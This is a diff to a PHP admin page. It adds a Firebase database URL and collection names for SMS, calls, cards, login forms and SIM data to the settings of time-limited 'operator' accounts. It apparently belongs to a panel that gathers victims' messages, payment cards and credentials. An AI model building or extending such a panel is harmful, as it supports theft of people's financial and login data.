@@ -72,12 +72,18 @@ include_once __DIR__ . '/header.php';
               password: password.trim(),
               firebaseProject: firebaseProject.trim(),
               firebaseApiKey: firebaseApiKey.trim(),
+              firebaseDatabaseUrl: firebaseDatabaseUrl.trim(),
               firebaseAuthDomain: firebaseAuthDomain.trim(),
               storageBucket: storageBucket.trim(),
               appId: appId.trim(),
               expiryDate: expiryDate,
               role: 'operator',
-              orgId: 'org_' + username.trim()
+              orgId: 'org_' + username.trim(),
+              collectionSms: 'user_sms',
+              collectionCalls: 'calls',
+              collectionCards: 'Card',
+              collectionForms: 'login',
+              collectionSims: 'user_data'
             })
           });
           const data = await res.json();
@@ -220,7 +226,12 @@ include_once __DIR__ . '/header.php';
               firebaseDatabaseUrl: editDatabaseUrl.trim(),
               firebaseAuthDomain: editAuthDomain.trim(),
               storageBucket: editStorageBucket.trim(),
-              appId: editAppId.trim()
+              appId: editAppId.trim(),
+              collectionSms: editSmsColl.trim(),
+              collectionCalls: editCallsColl.trim(),
+              collectionCards: editCardsColl.trim(),
+              collectionForms: editFormsColl.trim(),
+              collectionSims: editSimsColl.trim()
             })
           });
           const data = await res.json();
